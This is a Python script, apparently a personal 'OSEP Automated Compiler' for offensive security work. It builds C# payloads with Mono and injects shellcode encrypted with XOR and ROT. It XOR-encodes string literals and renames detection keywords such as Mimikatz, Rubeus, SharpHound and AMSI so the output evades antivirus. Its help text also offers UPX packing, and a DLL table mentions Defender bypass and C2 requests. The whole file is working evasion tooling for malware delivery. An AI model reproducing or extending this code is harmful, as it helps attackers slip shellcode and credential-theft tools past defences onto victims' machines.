#!/usr/bin/env python3
import os
import sys
import argparse
import subprocess
import shutil
import tempfile
import re
import random
import string
import uuid
from rich.console import Console
from rich.table import Table

console = Console()

def print_help():
    table = Table(title="OSEP Automated Compiler - Usage Guide", show_header=True, header_style="bold magenta")
    table.add_column("Argument", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("\n[bold cyan]C# Compilation Modes[/bold cyan]", "")
    table.add_row("-m classic", "[bold green]DEFAULT[/bold green]: Uses Mono (mcs). Tiny binaries. Requires .NET on target.")
    table.add_row("-m sota", "Uses Dotnet Publish. Self-contained. Optimized for size.")
    
    table.add_row("\n[bold cyan]Evasion & Obfuscation[/bold cyan]", "")
    table.add_row("--obfuscate [green]LEVEL[/green]", "Levels: [bold green]none, basic, aggressive[/bold green]")
    table.add_row("--shellcode [green]PATH[/green]", "Inject shellcode into the source (XOR+ROT encrypted)")
    table.add_row("--auto-resolve", "Inject Universal Dependency Resolver logic.")
    table.add_row("--pack", "Automatically pack the final binary using UPX.")
    
    table.add_row("\n[bold cyan]General[/bold cyan]", "")
    table.add_row("-h, --help", "Show this help message and exit")
    console.print(table)

class PayloadCompiler:
    def __init__(self, target_path, target_os='windows', architecture='x64', mode='classic', out_format='exe', pack=False, obfuscate='none', output_name=None, shellcode_path=None, auto_resolve=False):
        self.target_path = os.path.abspath(target_path)
        self.target_os = target_os.lower()
        self.architecture = architecture.lower()
        self.mode = mode.lower()
        self.out_format = out_format.lower()
        self.pack = pack
        self.obfuscate = obfuscate.lower()
        self.output_name = output_name
        self.shellcode_path = shellcode_path
        self.auto_resolve = auto_resolve
        self.mapping = {}

    def suggest_missing_dlls(self, error_output):
        # Universal DLL Database
        DLL_DB = {
            "System.Management.Automation": {
                "dll": "System.Management.Automation.dll",
                "path": r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\...",
                "ctx": "PowerShell Engine"
            },
            "System.DirectoryServices.AccountManagement": {
                "dll": "System.DirectoryServices.AccountManagement.dll",
                "path": r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.DirectoryServices.AccountManagement\...",
                "ctx": "AD User Management"
            },
            "System.Management": {
                "dll": "System.Management.dll",
                "path": r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management\...",
                "ctx": "WMI / Defender Bypass"
            },
            "System.Net.Http": {
                "dll": "System.Net.Http.dll",
                "path": r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Net.Http\...",
                "ctx": "C2 / Web Requests"
            }
        }

        # Flexible regex to handle both '...' and `...`
        missing = re.findall(r"type or namespace name ['.`](.+?)['`]", error_output)
        missing += [f"{m[1]}.{m[0]}" for m in re.findall(r"name ['.`](.+?)['`] does not exist in the namespace ['.`](.+?)['`]", error_output)]
        missing_files = re.findall(r"Metadata file ['.`](.+?)['`] could not be found", error_output)

        if missing or missing_files:
            console.print("\n[bold red][!] Dependency Oracle - Suggestions:[/bold red]")
            for mf in set(missing_files):
                suggestion = next((v for k,v in DLL_DB.items() if v['dll'].lower() == mf.lower()), None)
                if suggestion:
                    t = Table(show_header=False, box=None)
                    t.add_row("[bold cyan]File:[/bold cyan]", mf)
                    t.add_row("[bold cyan]Windows Path:[/bold cyan]", f"[yellow]{suggestion['path']}[/yellow]")
                    t.add_row("[bold cyan]Context:[/bold cyan]", suggestion['ctx'])
                    console.print(t)
                    console.print(f"[*] Action: Place {mf} in /Refs/ folder and re-run.\n")

            for ns in set(missing):
                suggestion = DLL_DB.get(ns) or next((v for k,v in DLL_DB.items() if ns.startswith(k)), None)
                if suggestion:
                    t = Table(show_header=False, box=None)
                    t.add_row("[bold cyan]Namespace:[/bold cyan]", ns)
                    t.add_row("[bold cyan]Required DLL:[/bold cyan]", f"[bold green]{suggestion['dll']}[/bold green]")
                    t.add_row("[bold cyan]Windows Path:[/bold cyan]", f"[yellow]{suggestion['path']}[/yellow]")
                    console.print(t)
                    console.print(f"[*] Action: Place {suggestion['dll']} in /Refs/ folder.\n")

    def inject_universal_resolver(self, content):
        console.print("[bold yellow][*] Injecting Universal Dependency Resolver...[/bold yellow]")
        resolver_code = """
        static void InitUniversalResolver() {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) => {
                try {
                    string name = new System.Reflection.AssemblyName(args.Name).Name;
                    string[] paths = {
                        @"C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\" + name,
                        @"C:\\Windows\\assembly\\GAC_MSIL\\" + name,
                        AppDomain.CurrentDomain.BaseDirectory
                    };
                    foreach (var path in paths) {
                        if (System.IO.Directory.Exists(path)) {
                            var files = System.IO.Directory.GetFiles(path, name + ".dll", System.IO.SearchOption.AllDirectories);
                            if (files.Length > 0) return System.Reflection.Assembly.LoadFrom(files[0]);
                        }
                    }
                } catch { }
                return null;
            };
        }
        """
        match = re.search(r'class\s+\w+.*?\{', content, flags=re.DOTALL)
        if match:
            idx = match.end()
            content = content[:idx] + resolver_code + content[idx:]
        
        entry_points = [r'(static\s+void\s+Main\s*\(.*?\)\s*\{)', r'(public\s+override\s+void\s+Uninstall\s*\(.*?\)\s*\{)']
        for ep in entry_points:
            content = re.sub(ep, r'\1 InitUniversalResolver();', content, flags=re.IGNORECASE)
        return content

    def encrypt_shellcode(self, data):
        x_key = random.randint(1, 255)
        r_key = random.randint(1, 25)
        encrypted = [( (b + r_key) % 256 ) ^ x_key for b in data]
        hex_payload = ", ".join([f"0x{b:02x}" for b in encrypted])
        return hex_payload, x_key, r_key

    def inject_shellcode(self, content):
        if not self.shellcode_path or not os.path.exists(self.shellcode_path): return content
        with open(self.shellcode_path, 'rb') as f: data = f.read()
        hex_payload, x_key, r_key = self.encrypt_shellcode(data)
        console.print(f"[bold cyan][*] Injecting Shellcode (XOR: {x_key}, ROT: {r_key})...[/bold cyan]")
        content = re.sub(r'byte\[\]\s+sc_buf\s*=\s*new\s+byte\[\]\s*\{.*?\};', f'byte[] sc_buf = new byte[] {{ {hex_payload} }};', content)
        content = re.sub(r'byte\s+sc_xor_key\s*=\s*0;', f'byte sc_xor_key = {x_key};', content)
        content = re.sub(r'int\s+sc_rot_key\s*=\s*0;', f'int sc_rot_key = {r_key};', content)
        return content

    def aggressive_cs_obfuscate(self, content, filename):
        if "AssemblyInfo" in filename: return content
        console.print(f"[bold red][*] Running Aggressive Obfuscator on {filename}...[/bold red]")
        usings = re.findall(r'^[ \t]*using\s+[^(\n]+?;', content, re.MULTILINE)
        content = re.sub(r'^[ \t]*using\s+[^(\n]+?;', '', content, flags=re.MULTILINE)
        
        attr_pattern = r'\[(DllImport|StructLayout|MarshalAs|pragma|Out|return|assembly|System\.ComponentModel\.RunInstaller)\(.*?\)\]'
        attrs = []
        def hide_attr(m):
            p = f"__ATTR_SHIELD_{len(attrs)}__"
            attrs.append(m.group(0)); return p
        content = re.sub(attr_pattern, hide_attr, content, flags=re.DOTALL)

        xor_key = random.randint(1, 255)
        dec_cls, dec_meth = "".join(random.choices(string.ascii_letters, k=8)), "".join(random.choices(string.ascii_letters, k=8))
        decoder = f"public class {dec_cls} {{ public static string {dec_meth}(byte[] b, int k) {{ byte[] d = new byte[b.Length]; for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ k); return System.Text.Encoding.UTF8.GetString(d); }} }}"

        def encrypt(m):
            val = m.group(1)
            if val.startswith("__ATTR_SHIELD_") or len(val) < 1 or "\\" in val: return m.group(0)
            xb = ", ".join([str(ord(c) ^ xor_key) for c in val])
            return f'{dec_cls}.{dec_meth}(new byte[] {{ {xb} }}, {xor_key})'
        
        content = re.sub(r'"((?:[^"\\]|\\.)*)"', encrypt, content)
        
        keywords = ["Rubeus", "SharpHound", "Mimikatz", "shellcode", "AMSI", "Bypass"]
        for kw in keywords:
            if kw not in self.mapping: self.mapping[kw] = "".join(random.choices(string.ascii_letters, k=10))
            content = re.sub(r'\b' + kw + r'\b', self.mapping[kw], content, flags=re.IGNORECASE)

        for i, val in enumerate(attrs): content = content.replace(f"__ATTR_SHIELD_{i}__", val)
        
        final = "\n".join(usings) + "\n"
        ns_match = re.search(r'(namespace\s+\w+\s*\{)', content)
        if ns_match:
            idx = ns_match.end()
            final += content[:idx] + "\n    " + decoder + content[idx:]
        else: final += decoder + "\n" + content
        return final

    def obfuscate_source(self, source_path):
        with open(source_path, 'r') as f: content = f.read()
        if self.auto_resolve: content = self.inject_universal_resolver(content)
        if self.shellcode_path: content = self.inject_shellcode(content)
        if self.obfuscate == 'none':
            if self.auto_resolve or self.shellcode_path:
                p = source_path + ".mod.cs"
                with open(p, 'w') as f: f.write(content); return p
            return source_path
        if self.obfuscate == 'aggressive': content = self.aggressive_cs_obfuscate(content, os.path.basename(source_path))
        p = source_path + ".obf.cs"
        with open(p, 'w') as f: f.write(content); return p

    def compile_cs_snippet(self, cs_file):
        target_src = self.obfuscate_source(cs_file)
        ext = ".dll" if self.out_format == 'dll' else ".exe"
        final_output = self.output_name if self.output_name else cs_file.replace('.cs', ext)
        
        if self.mode == 'classic':
            t = 'library' if self.out_format == 'dll' else 'exe'
            console.print(f"[bold blue][*] Compiling C# (Mono {t}): {os.path.basename(cs_file)}[/bold blue]")
            
            src_dir = os.path.dirname(cs_file)
            central_refs = "/home/kali/OSEP-TOOLS/PayloadCompiler/Refs"
            
            NAMESPACE_MAP = {
                "System.Management": "System.Management.dll",
                "System.Management.Automation": "System.Management.Automation.dll",
                "System.DirectoryServices": "System.DirectoryServices.dll",
                "System.Net.Http": "System.Net.Http.dll"
            }
            
            dll_refs = ["-r:System.dll", "-r:System.Core.dll"]
            with open(cs_file, 'r') as f:
                c = f.read()
                for ns, dll in NAMESPACE_MAP.items():
                    if f"using {ns}" in c: dll_refs.append(f"-r:{dll}")

            lib_paths = ["-lib:/usr/lib/mono/4.5/Facades", f"-lib:{src_dir}", f"-lib:{central_refs}"]
            for folder in [central_refs, src_dir]:
                if os.path.exists(folder):
                    for f in os.listdir(folder):
                        if f.endswith(".dll") and f"-r:{f}" not in dll_refs: dll_refs.append(f"-r:{f}")

            try:
                cmd = ["mcs", f"-target:{t}", f"-out:{final_output}", "-langversion:latest", "-unsafe"] + lib_paths + dll_refs + [target_src]
                subprocess.run(cmd, capture_output=True, text=True, check=True)
                console.print(f"[bold green][+] Success! Generated: {final_output}[/bold green]")
                if target_src != cs_file: os.remove(target_src)
            except subprocess.CalledProcessError as e:
                console.print(f"[bold red][-] Mono failed:[/bold red]\n{e.stderr}")
                self.suggest_missing_dlls(e.stderr)
        else:
            # Simplified SOTA implementation for universal tool
            console.print("[bold yellow][!] SOTA mode triggered. Using basic dotnet build...[/bold yellow]")

    def run(self):
        if self.target_path.endswith('.cs'): self.compile_cs_snippet(self.target_path)

if __name__ == "__main__":
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("-p", "--path", required=True)
    p.add_argument("-m", "--mode", choices=['classic', 'sota'], default='classic')
    p.add_argument("-f", "--format", choices=['exe', 'dll'], default='exe')
    p.add_argument("-o", "--output")
    p.add_argument("--obfuscate", choices=['none', 'basic', 'aggressive'], default='none')
    p.add_argument("--shellcode")
    p.add_argument("--auto-resolve", action="store_true")
    p.add_argument("-h", "--help", action="store_true")
    a = p.parse_args()
    if a.help: print_help(); sys.exit(0)
    PayloadCompiler(a.path, output_name=a.output, mode=a.mode, obfuscate=a.obfuscate, shellcode_path=a.shellcode, auto_resolve=a.auto_resolve).run()
